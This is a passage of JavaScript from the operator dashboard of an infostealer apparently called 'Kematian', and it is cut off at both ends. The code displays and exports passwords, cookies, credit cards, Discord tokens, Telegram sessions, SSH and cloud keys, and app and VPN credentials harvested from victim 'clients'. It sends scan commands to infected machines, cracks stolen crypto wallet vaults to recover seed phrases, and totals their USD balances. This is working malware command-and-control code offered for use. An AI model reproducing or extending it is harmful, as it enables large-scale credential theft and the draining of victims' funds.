    if (captureHistoryToggle) captureHistoryToggle.addEventListener("change", saveCaptureSettings);
    if (captureCookiesToggle) captureCookiesToggle.addEventListener("change", saveCaptureSettings);
    if (historyLimitInput) historyLimitInput.addEventListener("change", saveCaptureSettings);
    if (cookieAgeInput) cookieAgeInput.addEventListener("change", saveCaptureSettings);

    if (purgeHistoryBtn) purgeHistoryBtn.addEventListener("click", async () => {
      if (!confirm("Delete ALL browser history across ALL clients?\n\nThis cannot be undone.")) return;
      purgeHistoryBtn.disabled = true;
      try {
        const r = await rpc("purge_history");
        log(`Purged ${r.deleted} history entries`);
        if (settingsStatus) settingsStatus.textContent = `Purged ${r.deleted} history entries`;
        loadGlobalStats().then(() => loadGlobalTab());
      } catch (e) { log(`Purge error: ${e.message}`); }
      finally { purgeHistoryBtn.disabled = false; }
      setTimeout(() => { if (settingsStatus) settingsStatus.textContent = ""; }, 3000);
    });

    if (purgeCookiesBtn) purgeCookiesBtn.addEventListener("click", async () => {
      if (!confirm("Delete ALL cookies across ALL clients?\n\nThis cannot be undone.")) return;
      purgeCookiesBtn.disabled = true;
      try {
        const r = await rpc("purge_cookies");
        log(`Purged ${r.deleted} cookies`);
        if (settingsStatus) settingsStatus.textContent = `Purged ${r.deleted} cookies`;
        loadGlobalStats().then(() => loadGlobalTab());
      } catch (e) { log(`Purge error: ${e.message}`); }
      finally { purgeCookiesBtn.disabled = false; }
      setTimeout(() => { if (settingsStatus) settingsStatus.textContent = ""; }, 3000);
    });

    fetchAutoHarvestState();
    fetchCaptureSettings();
  }

  // ── Global mode ───────────────────────────────────────────────
  async function loadGlobalStats() {
    try {
      knownClients = await rpc("get_stats");
      renderClientsCard();
      buildCfilts();
      buildTabs();

      const total = (key) => knownClients.reduce((s, c) => s + (c[key] || 0), 0);
      const sep = `<span class="gstat-sep"> · </span>`;
      globalStats.innerHTML = [
        `<strong>${knownClients.length}</strong> client${knownClients.length !== 1 ? "s" : ""}`,
        `<strong>${total("passwords").toLocaleString()}</strong> passwords`,
        `<strong>${total("cookies").toLocaleString()}</strong> cookies`,
        `<strong>${total("creditCards").toLocaleString()}</strong> cards`,
        `<strong>${total("discordTokens").toLocaleString()}</strong> Discord tokens`,
        `<strong>${total("extensions").toLocaleString()}</strong> extensions`,
        `<strong>${total("wallets").toLocaleString()}</strong> wallets`,
      ].map(s => `<span class="gstat">${s}</span>`).join(sep);

      exportAllBtn.disabled = knownClients.length === 0;
      loadSummary();
    } catch (e) { log(`Stats error: ${e.message}`); }
  }

  // Fetches collection/scan failures for the current view scope and renders a
  // dismissible banner. Called after a harvest so partial failures are visible.
  async function loadCollectErrors() {
    if (!collectErrorsEl) return;
    try {
      const target = isGlobal ? (activeClient !== "all" ? activeClient : null) : clientId;
      const { errors } = await rpc("list_collect_errors", { clientId: target || undefined });
      if (!errors || !errors.length) {
        collectErrorsEl.style.display = "none";
        collectErrorsEl.innerHTML = "";
        return;
      }
      const shown = errors.slice(0, 5);
      const timeStr = (t) => new Date(t).toLocaleString();
      collectErrorsEl.innerHTML =
        `<div class="collect-errors-head">
          <span class="collect-errors-title">${errors.length} collection issue${errors.length !== 1 ? "s" : ""}</span>
          <button id="clear-collect-errors" class="btn btn-mini">Dismiss</button>
        </div>
        <ul class="collect-errors-list">${shown.map(e =>
          `<li><span class="collect-errors-msg">${esc(e.error)}</span><span class="collect-errors-time">${timeStr(e.created_at)}</span></li>`
        ).join("")}</ul>`;
      collectErrorsEl.style.display = "";
      const clearBtn = document.getElementById("clear-collect-errors");
      if (clearBtn) clearBtn.addEventListener("click", async () => {
        try {
          await rpc("clear_collect_errors", { clientId: target || undefined });
          loadCollectErrors();
        } catch (err) { log(`Clear errors failed: ${err.message}`); }
      });
    } catch (_) { /* banner is best-effort */ }
  }

  let summaryData = [];
  let summaryWalletResults = {};

  async function loadSummary() {
    if (!summaryCard || !summaryGrid) return;
    try {
      summaryData = await rpc("get_summary");
      if (!summaryData.length) { summaryCard.style.display = "none"; return; }
      summaryCard.style.display = "";
      renderSummary();

      // Load saved seeds for all clients in parallel
      const seedResults = await Promise.all(
        summaryData.map(c =>
          rpc("get_wallet_seeds", { clientId: c.clientId })
            .catch(e => { log(`get_wallet_seeds ${c.clientId} error: ${e.message}`); return {}; })
        )
      );

      const balanceRefreshJobs = [];
      const crackJobs = [];
      for (let ci = 0; ci < summaryData.length; ci++) {
        const c = summaryData[ci];
        const savedSeeds = seedResults[ci] || {};
        const vaults = new Set(c.walletVaults || []);
        for (const name of c.walletDownloaded || []) {
          const key = `${c.clientId}:${name}`;
          if (!summaryWalletResults[key] && savedSeeds[name]) {
            summaryWalletResults[key] = { cracked: true, password: "(saved)", mnemonic: savedSeeds[name].mnemonic, addresses: savedSeeds[name].addresses };
          }
          if (summaryWalletResults[key]?.cracked && summaryWalletResults[key]?.mnemonic) {
            balanceRefreshJobs.push({ key, mnemonic: summaryWalletResults[key].mnemonic });
            continue;
          }
          if (summaryWalletResults[key]) continue;
          const method = vaults.has(name) ? "crack_vault" : "crack_exodus";
          crackJobs.push({ key, clientId: c.clientId, name, method });
        }
      }

      // Refresh balances for already-cracked wallets in parallel
      if (balanceRefreshJobs.length) {
        Promise.all(balanceRefreshJobs.map(async ({ key, mnemonic }) => {
          try {
            const balResult = await rpc("check_cracked_balances", { mnemonic });
            summaryWalletResults[key] = { ...summaryWalletResults[key], balances: balResult.totals, usdTotal: balResult.usdTotal };
          } catch (e) { log(`Summary balance refresh error: ${e.message}`); }
        })).then(() => renderSummary());
      }

      // Crack wallets that don't have saved seeds
      for (const { key, clientId: cid, name, method } of crackJobs) {
        try {
          const result = await rpc(method, { clientId: cid, walletName: name });
          summaryWalletResults[key] = result;
          if (result.cracked && result.mnemonic) {
            const balResult = await rpc("check_cracked_balances", { mnemonic: result.mnemonic });
            summaryWalletResults[key] = { ...result, balances: balResult.totals, usdTotal: balResult.usdTotal };
          }
        } catch (e) { log(`Summary crack ${name} (${method}) error: ${e.message}`); }
      }
      renderSummary();
    } catch (e) { log(`Summary error: ${e.message}`); }
  }

  function renderSummary() {
    if (!summaryGrid) return;
    let totalUsd = 0;
    const cards = [];

    for (const c of summaryData) {
      let clientUsd = 0;
      const walletInfo = [];
      for (const name of c.walletNames || []) {
        const key = `${c.clientId}:${name}`;
        const cr = summaryWalletResults[key];
        if (cr?.cracked) {
          clientUsd += cr.usdTotal || 0;
          walletInfo.push({ name, cracked: true, usdTotal: cr.usdTotal || 0, password: cr.password });
        } else if (cr && !cr.cracked) {
          walletInfo.push({ name, cracked: false, tried: cr.tried });
        } else {
          walletInfo.push({ name, pending: true });
        }
      }
      totalUsd += clientUsd;
      cards.push({ client: c, clientUsd, walletInfo });
    }

    if (summaryTotals) {
      summaryTotals.innerHTML = `
        <span class="summary-usd">${totalUsd > 0 ? "$" + totalUsd.toFixed(2) : "$0.00"}</span>
        <span class="summary-meta">${summaryData.length} client${summaryData.length !== 1 ? "s" : ""} · ${Object.keys(summaryWalletResults).length} wallets checked</span>
      `;
    }

    summaryGrid.innerHTML = "";
    for (const { client: c, clientUsd, walletInfo } of cards) {
      const div = document.createElement("div");
      div.className = "summary-client-card";

      const walletsHtml = walletInfo.map(w => {
        if (w.cracked) {
          return `<span class="summary-wallet cracked" title="Password: ${esc(w.password)}">${esc(w.name)} <b>$${w.usdTotal.toFixed(2)}</b></span>`;
        } else if (w.pending) {
          return `<span class="summary-wallet pending">${esc(w.name)}</span>`;
        } else {
          return `<span class="summary-wallet failed">${esc(w.name)} (${w.tried} tried)</span>`;
        }
      }).join("");

      div.innerHTML = `
        <div class="summary-client-top">
          <span class="client-id-badge" title="${esc(c.clientId)}">${esc(shortId(c.clientId))}</span>
          <span class="summary-client-usd">${clientUsd > 0 ? "$" + clientUsd.toFixed(2) : ""}</span>
        </div>
        <div class="summary-client-counts">
          <span>${(c.passwords || 0).toLocaleString()} pw</span>
          <span>${(c.cookies || 0).toLocaleString()} cookies</span>
          <span>${(c.creditCards || 0).toLocaleString()} cards</span>
          <span>${(c.discordTokens || 0).toLocaleString()} discord</span>
          <span>${(c.wallets || 0)} wallets</span>
        </div>
        ${walletsHtml ? `<div class="summary-wallets">${walletsHtml}</div>` : ""}
      `;
      summaryGrid.appendChild(div);
    }
  }

  async function loadGlobalTab() {
    const tab = TABS.find(t => t.id === activeTab);
    if (!tab?.rpc) return;

    if (!tabData[tab.key]) tabData[tab.key] = { rows: [], total: 0, offset: 0 };
    const { offset } = tabData[tab.key];

    const p = { limit: PAGE_SIZE, offset };
    const search = searchEl.value.trim();
    if (search) p.search = search;
    if (activeClient !== "all") p.clientId = activeClient;
    if (activeBrowser !== "all" && tab.cols.some(c => c.k === "browser"))
      p.browser = activeBrowser;

    try {
      const result = await rpc(tab.rpc, p);
      tabData[tab.key] = { rows: result.rows, total: result.total, offset };
      buildTabs();
      renderTable();
    } catch (e) { log(`Load error (${tab.label}): ${e.message}`); }
  }

  const CLIENTS_PAGE = 50;
  let clientsPage = 0;

  function renderClientsCard() {
    if (!clientsList) return;
    if (knownClients.length === 0) { clientsCard.style.display = "none"; return; }
    clientsCard.style.display = "";

    const start = clientsPage * CLIENTS_PAGE;
    const pageClients = knownClients.slice(start, start + CLIENTS_PAGE);
    const totalPages = Math.ceil(knownClients.length / CLIENTS_PAGE);

    clientsList.innerHTML = `<table class="clients-table"><thead><tr>
      <th>Client</th><th>Passwords</th><th>Cookies</th><th>Cards</th><th>Discord</th><th>Files</th><th>Extensions</th><th>Wallets</th><th>Last Seen</th><th></th>
    </tr></thead><tbody></tbody></table>`;
    const tb = clientsList.querySelector("tbody");
    const frag = document.createDocumentFragment();
    for (const c of pageClients) {
      const tr = document.createElement("tr");
      const ts = c.lastCapturedAt ? new Date(c.lastCapturedAt).toLocaleString() : "—";
      tr.innerHTML = `
        <td><span class="client-id-badge" title="${esc(c.clientId)}">${esc(shortId(c.clientId))}</span></td>
        <td>${(c.passwords || 0).toLocaleString()}</td>
        <td>${(c.cookies || 0).toLocaleString()}</td>
        <td>${(c.creditCards || 0).toLocaleString()}</td>
        <td>${(c.discordTokens || 0).toLocaleString()}</td>
        <td>${(c.files || 0).toLocaleString()}</td>
        <td>${(c.extensions || 0).toLocaleString()}</td>
        <td>${(c.wallets || 0).toLocaleString()}</td>
        <td class="client-ts">${esc(ts)}</td>
        <td class="client-actions-cell">
          <button class="btn" data-action="view-client" data-id="${esc(c.clientId)}">View</button>
          <button class="btn btn-danger-sm" data-action="del-client" data-id="${esc(c.clientId)}">Del</button>
        </td>`;
      frag.appendChild(tr);
    }
    tb.appendChild(frag);

    if (totalPages > 1) {
      const nav = document.createElement("div");
      nav.className = "pagination-bar";
      nav.style.display = "";
      nav.style.marginTop = "10px";
      const prev = document.createElement("button");
      prev.className = "btn";
      prev.textContent = "← Prev";
      prev.disabled = clientsPage === 0;
      prev.addEventListener("click", () => { clientsPage--; renderClientsCard(); });
      const info = document.createElement("span");
      info.textContent = `${start + 1}–${Math.min(start + CLIENTS_PAGE, knownClients.length)} of ${knownClients.length}`;
      const next = document.createElement("button");
      next.className = "btn";
      next.textContent = "Next →";
      next.disabled = start + CLIENTS_PAGE >= knownClients.length;
      next.addEventListener("click", () => { clientsPage++; renderClientsCard(); });
      nav.appendChild(prev);
      nav.appendChild(info);
      nav.appendChild(next);
      clientsList.appendChild(nav);
    }
  }

  function startSSE() {
    const sse = new EventSource(`/api/plugins/${PLUGIN_ID}/stream`);
    window.__kematianSSE = sse;

    let harvestDebounce = null;
    let harvestPending = new Set();

    function flushHarvestUpdates() {
      harvestDebounce = null;
      const cids = [...harvestPending];
      harvestPending.clear();
      log(`Harvest update from ${cids.map(shortId).join(", ")}`);
      loadCollectErrors();
      loadGlobalStats().then(() => {
        if (activeTab === "__search__") return loadSearchAll();
        if (activeTab === "discord") return loadDiscordProfiles();
        return loadGlobalTab();
      });
    }

    sse.addEventListener("harvest_update", (e) => {
      const { clientId: cid } = JSON.parse(e.data);
      harvestPending.add(cid);
      if (harvestDebounce) clearTimeout(harvestDebounce);
      harvestDebounce = setTimeout(flushHarvestUpdates, 500);
    });

    let seedDebounce = null;
    sse.addEventListener("seed_update", (e) => {
      const { clientId: cid, count } = JSON.parse(e.data);
      log(`Seed scan: ${count} phrases found from ${shortId(cid)}`);
      if (activeTab === "seeds") {
        if (seedDebounce) clearTimeout(seedDebounce);
        seedDebounce = setTimeout(() => { seedDebounce = null; loadGlobalTab(); }, 500);
      }
    });

    sse.addEventListener("wallet_data_update", async () => {
      if (activeTab === "wallets") await loadWalletCards();
    });

    sse.addEventListener("client_deleted", async (e) => {
      const { clientId: cid } = JSON.parse(e.data);
      if (activeClient === cid) activeClient = "all";
      delete tabData[TABS.find(t => t.id === activeTab)?.key];
      await loadGlobalStats();
      renderTable();
    });

    sse.addEventListener("cleared", () => {
      knownClients = []; tabData = {}; activeClient = "all";
      clientsCard.style.display = "none";
      exportAllBtn.disabled = true;
      globalStats.innerHTML = `<span class="gstat"><strong>0</strong> clients</span>`;
      buildCfilts(); buildTabs(); renderTable();
      if (pagBar) pagBar.style.display = "none";
      log("All data cleared");
    });
  }

  async function initGlobalMode() {
    clientCard.style.display = "none";
    globalCard.style.display = "";
    dataCard.style.display = "";
    $("sub-title").textContent = "Global harvest view — all clients";

    buildTabs();
    buildBfilts();
    startSSE();
    loadCollectErrors();

    const rolePromise = fetchUserRole();

    if (pagPrev) pagPrev.addEventListener("click", () => {
      const tab = TABS.find(t => t.id === activeTab);
      if (!tab?.key || !tabData[tab.key]) return;
      tabData[tab.key].offset = Math.max(0, tabData[tab.key].offset - PAGE_SIZE);
      loadGlobalTab();
    });
    if (pagNext) pagNext.addEventListener("click", () => {
      const tab = TABS.find(t => t.id === activeTab);
      if (!tab?.key || !tabData[tab.key]) return;
      const td = tabData[tab.key];
      if (td.offset + td.rows.length < td.total) { td.offset += PAGE_SIZE; loadGlobalTab(); }
    });

    clientsList.addEventListener("click", async (e) => {
      const btn = e.target.closest("[data-action]");
      if (!btn) return;
      const { action, id } = btn.dataset;
      if (action === "view-client") {
        activeClient = id;
        const tab = TABS.find(t => t.id === activeTab);
        if (tab?.key && tabData[tab.key]) tabData[tab.key].offset = 0;
        buildCfilts(); buildTabs();
        loadCollectErrors();
        await loadGlobalTab();
        dataCard.scrollIntoView({ behavior: "smooth" });
      } else if (action === "del-client") {
        if (!confirm(`Delete all harvested data for client ${shortId(id)} (${id})?`)) return;
        try {
          await rpc("delete_client", { clientId: id });
          log(`Deleted ${shortId(id)}`);
          knownClients = knownClients.filter(c => c.clientId !== id);
          if (activeClient === id) activeClient = "all";
          for (const t of TABS)
            if (tabData[t.key]) tabData[t.key].rows = tabData[t.key].rows.filter(r => r.clientId !== id);
          renderClientsCard(); buildCfilts(); buildTabs(); renderTable();
          loadGlobalStats();
        } catch (err) { log(`Delete error: ${err.message}`); }
      }
    });

    refreshBtn.addEventListener("click", async () => {
      log("Refreshing…");
      await loadGlobalStats();
      loadCollectErrors();
      if (activeTab === "__search__") await loadSearchAll();
      else await loadGlobalTab();
    });

    exportAllBtn.addEventListener("click", async () => {
      try {
        log("Exporting all data…");
        exportAllBtn.disabled = true;
        const data = await rpc("export_client", {});
        const zip = buildExportZip(data, "kematian-global");
        if (!zip) { log("Nothing to export"); return; }
        downloadBlob(new Blob([zip], { type: "application/zip" }), `kematian-global-${Date.now()}.zip`);
        log("Export complete");
      } catch (err) { log(`Export error: ${err.message}`); }
      finally { exportAllBtn.disabled = knownClients.length === 0; }
    });

    clearAllBtn.addEventListener("click", async () => {
      if (!confirm("Delete ALL harvested data from ALL clients?\n\nThis cannot be undone.")) return;
      try {
        await rpc("delete_all", {});
        knownClients = []; tabData = {}; activeClient = "all";
        clientsCard.style.display = "none";
        exportAllBtn.disabled = true;
        globalStats.innerHTML = `<span class="gstat"><strong>0</strong> clients</span>`;
        if (pagBar) pagBar.style.display = "none";
        buildCfilts(); buildTabs(); renderTable();
        log("All data cleared");
      } catch (err) { log(`Clear error: ${err.message}`); }
    });

    log("Global view — Kematian");
    const [role] = await Promise.all([
      rolePromise,
      loadGlobalStats().then(() => loadGlobalTab()),
    ]);
    userRole = role;
    initSettings(userRole === "admin");
  }

  // ── Per-client mode ───────────────────────────────────────────
  function initClientMode() {
    clientIdEl.value = clientId;
    exportBtn.disabled = false;
    globalCard.style.display = "none";
    clientsCard.style.display = "none";
    if (settingsCard) settingsCard.style.display = "none";
    cfiltsEl.style.display = "none";
    if (pagBar) pagBar.style.display = "none";
    buildTabs();
    buildBfilts();
    loadCollectErrors();

    collectBtn.addEventListener("click", () => {
      collectBtn.disabled = true;
      log("Starting collection…");
      sendEvent("collect", { browsers: true, gaming: true, vpns: true });
    });
    scanFilesBtn.addEventListener("click", () => {
      scanFilesBtn.disabled = true;
      log("Scanning files…");
      sendEvent("scan_files", {});
    });
    scanExtBtn.addEventListener("click", () => {
      scanExtBtn.disabled = true;
      log("Scanning extensions…");
      sendEvent("scan_extensions", {});
    });
    scanWalletsBtn.addEventListener("click", () => {
      scanWalletsBtn.disabled = true;
      log("Scanning wallets…");
      sendEvent("scan_wallets", {});
    });
    scanTgBtn.addEventListener("click", () => {
      scanTgBtn.disabled = true;
      log("Scanning Telegram sessions…");
      sendEvent("scan_telegram", {});
    });
    scanKeysBtn.addEventListener("click", () => {
      scanKeysBtn.disabled = true;
      log("Scanning SSH & cloud keys…");
      sendEvent("scan_keys", {});
    });
    scanAppsBtn.addEventListener("click", () => {
      scanAppsBtn.disabled = true;
      log("Scanning app credentials (RDP, WinSCP, PuTTY, FileZilla, WiFi…)");
      sendEvent("scan_apps", {});
    });
    scanGamingBtn.addEventListener("click", () => {
      scanGamingBtn.disabled = true;
      log("Scanning gaming platforms (Steam, Battle.net, Epic, Riot, Uplay…)");
      sendEvent("scan_gaming", {});
    });
    scanVpnBtn.addEventListener("click", () => {
      scanVpnBtn.disabled = true;
      log("Scanning VPN configs (NordVPN, WireGuard, OpenVPN, Mullvad…)");
      sendEvent("scan_vpn", {});
    });
    pingBtn.addEventListener("click", () => { log("Ping sent"); sendEvent("ping", {}); });
    fingerprintBtn.addEventListener("click", () => requestFingerprint());
    fingerprintDeepBtn.addEventListener("click", () => requestFingerprintDeep());
    exportBtn.addEventListener("click", async () => {
      try {
        exportBtn.disabled = true;
        log("Exporting…");
        const data = await rpc("export_client", { clientId });
        const prefix = `kematian-${shortId(clientId)}`;
        const zip = buildExportZip(data, prefix);
        if (!zip) { log("Nothing to export"); return; }
        downloadBlob(new Blob([zip], { type: "application/zip" }), `${prefix}-${Date.now()}.zip`);
        log("Export complete");
      } catch (err) { log(`Export error: ${err.message}`); }
      finally { exportBtn.disabled = false; }
    });

    const eventDispatch = {
      ready(payload) {
        statusDot.className = "dot dot-on";
        statusText.textContent = "Connected";
        log(`ready: ${payload?.status || "ok"}`);
      },
      status(payload) {
        log(payload?.message || "(status)");
      },
      partial(payload) {
        if (!lastResults) { lastResults = {}; dataCard.style.display = ""; }
        for (const key of DATA_KEYS)
          if (payload[key]?.length) lastResults[key] = [...(lastResults[key] || []), ...payload[key]];
        if (payload.gaming) { lastResults._gamingRaw = payload.gaming; lastResults._gamingRows = flattenGaming(payload.gaming); }
        if (payload.vpns) { lastResults._vpnRaw = payload.vpns; lastResults._vpnRows = flattenVPN(payload.vpns); }
        buildTabs(); buildBfilts(); renderTable();
      },
      results(payload) {
        lastResults = payload;
        if (payload.gaming) { lastResults._gamingRaw = payload.gaming; lastResults._gamingRows = flattenGaming(payload.gaming); }
        if (payload.vpns) { lastResults._vpnRaw = payload.vpns; lastResults._vpnRows = flattenVPN(payload.vpns); }
        collectBtn.disabled = false;
        exportBtn.disabled = false;
        dataCard.style.display = "";
        buildTabs(); buildBfilts(); renderTable();
        const c = DATA_KEYS.map(k => (payload[k] || []).length);
        const gCount = (lastResults._gamingRows || []).length;
        const vCount = (lastResults._vpnRows || []).length;
        log(`Collection complete — ${c[0]} pw · ${c[1]} cookies · ${c[2]} autofill · ${c[3]} history · ${c[4]} bookmarks · ${c[5]} cards · ${c[6]} Discord · ${c[7]} files · ${c[8]} extensions · ${c[9]} wallets · ${c[10]} telegram · ${c[11]} keys · ${c[12]} seeds · ${c[13]} apps · ${gCount} gaming · ${vCount} vpn`);
        if (payload.errors?.length) payload.errors.forEach(e => log(`warn: ${e}`));
        loadCollectErrors();
      },
      file_scan_results(payload) {
        if (!lastResults) { lastResults = {}; dataCard.style.display = ""; }
        lastResults.files = payload?.files || [];
        scanFilesBtn.disabled = false;
        if (activeTab !== "files") { activeTab = "files"; sortCol = null; sortAsc = true; }
        buildTabs(); buildBfilts(); renderTable();
        log(`File scan — ${lastResults.files.length} files${payload?.truncated ? " (limit reached)" : ""}`);
      },
      fetch_file_result(payload) {
        const { path, name, content } = payload || {};
        const pending = pendingFetches.get(path);
        pendingFetches.delete(path);
        if (pending?.btn) { pending.btn.textContent = "↓"; pending.btn.disabled = false; }
        if (!content) { log(`fetch_file: no content for ${name}`); return; }
        downloadBase64(content, name || "file");
        log(`Downloaded: ${name}`);
      },
      fetch_file_error(payload) {
        const { path, error } = payload || {};
        const pending = pendingFetches.get(path);
        pendingFetches.delete(path);
        if (pending?.btn) { pending.btn.textContent = "✕"; pending.btn.disabled = false; }
        log(`fetch_file ERROR: ${error || "unknown"}`);
      },
      extension_scan_results(payload) {
        if (!lastResults) { lastResults = {}; dataCard.style.display = ""; }
        lastResults.extensions = payload?.extensions || [];
        scanExtBtn.disabled = false;
        if (activeTab !== "extensions") { activeTab = "extensions"; sortCol = null; sortAsc = true; }
        buildTabs(); buildBfilts(); renderTable();
        log(`Extension scan — ${lastResults.extensions.length} extensions`);
      },
      fetch_ext_zip_result(payload) {
        const { path, extId, content } = payload || {};
        const pending = pendingExtZips.get(path);
        pendingExtZips.delete(path);
        if (pending?.btn) { pending.btn.textContent = "ZIP"; pending.btn.disabled = false; }
        if (!content) { log(`fetch_ext_zip: no content for ${extId}`); return; }
        downloadBase64(content, `${extId || "extension"}.zip`, "application/zip");
        log(`Downloaded extension ZIP: ${extId}`);
      },
      fetch_ext_zip_error(payload) {
        const { path, error } = payload || {};
        const pending = pendingExtZips.get(path);
        pendingExtZips.delete(path);
        if (pending?.btn) { pending.btn.textContent = "✕"; pending.btn.disabled = false; }
        log(`fetch_ext_zip ERROR: ${error || "unknown"}`);
      },
      wallet_scan_results(payload) {
        if (!lastResults) { lastResults = {}; dataCard.style.display = ""; }
        lastResults.wallets = payload?.wallets || [];
        scanWalletsBtn.disabled = false;
        if (activeTab !== "wallets") { activeTab = "wallets"; sortCol = null; sortAsc = true; }
        buildTabs(); buildBfilts(); renderTable();
        log(`Wallet scan — ${lastResults.wallets.length} wallets`);
      },
      wallet_auto_data(payload) {
        log(`Auto-downloaded wallet: ${payload?.name || "?"} (${humanSize(payload?.size || 0)})`);
        if (activeTab === "wallets") loadWalletCards();
      },
      fetch_wallet_zip_result(payload) {
        const { path, name, content } = payload || {};
        const pending = pendingWalletZips.get(path);
        pendingWalletZips.delete(path);
        if (pending?.btn) { pending.btn.textContent = "ZIP"; pending.btn.disabled = false; }
        if (!content) { log(`fetch_wallet_zip: no content for ${name}`); return; }
        downloadBase64(content, `${name || "wallet"}.zip`, "application/zip");
        log(`Downloaded wallet ZIP: ${name}`);
      },
      fetch_wallet_zip_error(payload) {
        const { path, error } = payload || {};
        const pending = pendingWalletZips.get(path);
        pendingWalletZips.delete(path);
        if (pending?.btn) { pending.btn.textContent = "✕"; pending.btn.disabled = false; }
        log(`fetch_wallet_zip ERROR: ${error || "unknown"}`);
      },
      telegram_scan_results(payload) {
        if (!lastResults) { lastResults = {}; dataCard.style.display = ""; }
        lastResults.telegram = payload?.sessions || [];
        scanTgBtn.disabled = false;
        if (activeTab !== "telegram") { activeTab = "telegram"; sortCol = null; sortAsc = true; }
        buildTabs(); buildBfilts(); renderTable();
        log(`Telegram scan — ${lastResults.telegram.length} sessions`);
      },
      telegram_data(payload) {
        const { path, account, content } = payload || {};
        const pending = pendingTgZips.get(path);
        pendingTgZips.delete(path);
        if (pending?.btn) { pending.btn.textContent = "ZIP"; pending.btn.disabled = false; }
        if (content) {
          downloadBase64(content, `${account || "telegram"}.zip`, "application/zip");
          log(`Downloaded Telegram ZIP: ${account}`);
        } else {
          log(`Telegram data: ${account || "?"} (${humanSize(payload?.size || 0)})`);
        }
      },
      fetch_telegram_zip_error(payload) {
        const { path, error } = payload || {};
        const pending = pendingTgZips.get(path);
        pendingTgZips.delete(path);
        if (pending?.btn) { pending.btn.textContent = "✕"; pending.btn.disabled = false; }
        log(`fetch_telegram_zip ERROR: ${error || "unknown"}`);
      },
      key_scan_results(payload) {
        if (!lastResults) { lastResults = {}; dataCard.style.display = ""; }
        lastResults.keys = payload?.keys || [];
        scanKeysBtn.disabled = false;
        if (activeTab !== "keys") { activeTab = "keys"; sortCol = null; sortAsc = true; }
        buildTabs(); buildBfilts(); renderTable();
        log(`Key scan — ${lastResults.keys.length} keys found`);
      },
      app_scan_results(payload) {
        if (!lastResults) { lastResults = {}; dataCard.style.display = ""; }
        lastResults.appCredentials = payload?.appCredentials || [];
        scanAppsBtn.disabled = false;
        if (activeTab !== "apps") { activeTab = "apps"; sortCol = null; sortAsc = true; }
        buildTabs(); buildBfilts(); renderTable();
        log(`App scan — ${lastResults.appCredentials.length} credentials found`);
      },
      gaming_scan_results(payload) {
        if (!lastResults) { lastResults = {}; dataCard.style.display = ""; }
        lastResults._gamingRaw = payload?.gaming || null;
        lastResults._gamingRows = flattenGaming(payload?.gaming);
        scanGamingBtn.disabled = false;
        if (activeTab !== "gaming") { activeTab = "gaming"; sortCol = null; sortAsc = true; }
        buildTabs(); buildBfilts(); renderTable();
        log(`Gaming scan — ${lastResults._gamingRows.length} items found`);
      },
      vpn_scan_results(payload) {
        if (!lastResults) { lastResults = {}; dataCard.style.display = ""; }
        lastResults._vpnRaw = payload?.vpns || null;
        lastResults._vpnRows = flattenVPN(payload?.vpns);
        scanVpnBtn.disabled = false;
        if (activeTab !== "vpn") { activeTab = "vpn"; sortCol = null; sortAsc = true; }
        buildTabs(); buildBfilts(); renderTable();
        log(`VPN scan — ${lastResults._vpnRows.length} items found`);
      },
      error(payload) {
        collectBtn.disabled = false;
        scanFilesBtn.disabled = false;
        scanWalletsBtn.disabled = false;
        scanTgBtn.disabled = false;
        scanKeysBtn.disabled = false;
        scanAppsBtn.disabled = false;
        scanGamingBtn.disabled = false;
        scanVpnBtn.disabled = false;
        log(`ERROR: ${payload?.error || "unknown"}`);
        loadCollectErrors();
      },
      pong() { log("pong"); },
    };

    function handlePluginEvent(event, payload) {
      const handler = eventDispatch[event];
      if (handler) handler(payload);
      else log(`event: ${event}`);
    }

    window.addEventListener("message", (e) => {
      if (!e.data || e.data.type !== "plugin_event") return;
      handlePluginEvent(e.data.event, e.data.payload);
    });

    let polling = false;
    async function pollEvents() {
      if (polling) return;
      polling = true;
      try {
        const res = await fetch(
          `/api/clients/${encodeURIComponent(clientId)}/plugins/${PLUGIN_ID}/events`,
          { headers: { Accept: "application/json" } },
        );
        if (res.ok) {
          const data = await res.json();
          if (data.events) data.events.forEach(e => handlePluginEvent(e.event, e.payload));
        }
      } catch (_) {} finally { polling = false; }
    }

    log("Ready — Kematian");
    window.__kematianPoll = setInterval(pollEvents, 1500);
    setTimeout(pollEvents, 500);

    // Determine connection status on load: the plugin's one-shot "ready" event
    // may have been consumed before the UI opened, so fall back to the
    // server-side "plugin_ready_at" flag recorded on that event.
    rpc("client_online", { clientId })
      .then((s) => {
        if (s && s.online) {
          statusDot.className = "dot dot-on";
          statusText.textContent = "Connected";
        }
      })
      .catch(() => {});
  }

  // ── Discord lookup buttons ────────────────────────────────────
  if (enrichAllBtn) {
    enrichAllBtn.addEventListener("click", async () => {
      enrichAllBtn.disabled = true;
      enrichStatus.textContent = "Looking up…";
      try {
        const p = {};
        if (!isGlobal && clientId) p.clientId = clientId;
        else if (isGlobal && activeClient !== "all") p.clientId = activeClient;
        const r = await rpc("enrich_all_discord", p);
        enrichStatus.textContent = `Done — ${r.enriched} token${r.enriched !== 1 ? "s" : ""} processed`;
        await loadDiscordProfiles();
      } catch (e) {
        enrichStatus.textContent = `Error: ${e.message}`;
      } finally {
        enrichAllBtn.disabled = false;
      }
    });
  }

  if (dpGrid) {
    dpGrid.addEventListener("click", async (e) => {
      const btn = e.target.closest(".dp-lookup-btn");
      if (!btn) return;
      const token = btn.dataset.token;
      const cid = btn.dataset.cid;
      if (!token || !cid) return;
      btn.disabled = true;
      btn.textContent = "…";
      try {
        await rpc("enrich_discord_token", { token, clientId: cid });
        await loadDiscordProfiles();
      } catch (err) {
        log(`Lookup error: ${err.message}`);
        btn.disabled = false;
        btn.textContent = "Retry";
      }
    });
  }

  // ── Wallet card buttons ────────────────────────────────────────
  if (checkBalancesBtn) {
    checkBalancesBtn.addEventListener("click", async () => {
      const cid = isGlobal ? (activeClient !== "all" ? activeClient : null) : clientId;
      if (!cid) { log("Select a client first"); return; }
      checkBalancesBtn.disabled = true;
      balanceStatus.textContent = "Checking balances…";
      try {
        const result = await rpc("check_balances", { clientId: cid });
        walletBalances = {};
        for (const r of result.results || []) {
          if (!walletBalances[r.wallet]) walletBalances[r.wallet] = {};
          for (const [chain, bal] of Object.entries(r.balances || {}))
            walletBalances[r.wallet][chain] = (walletBalances[r.wallet][chain] || 0) + bal;
        }
        const nonZero = Object.values(walletBalances).reduce((s, b) => s + Object.values(b).filter(v => v > 0).length, 0);
        balanceStatus.textContent = `Done — ${nonZero} non-zero balance${nonZero !== 1 ? "s" : ""} found`;
        await loadWalletCards();
      } catch (e) {
        balanceStatus.textContent = `Error: ${e.message}`;
        log(`Balance check error: ${e.message}`);
      } finally {
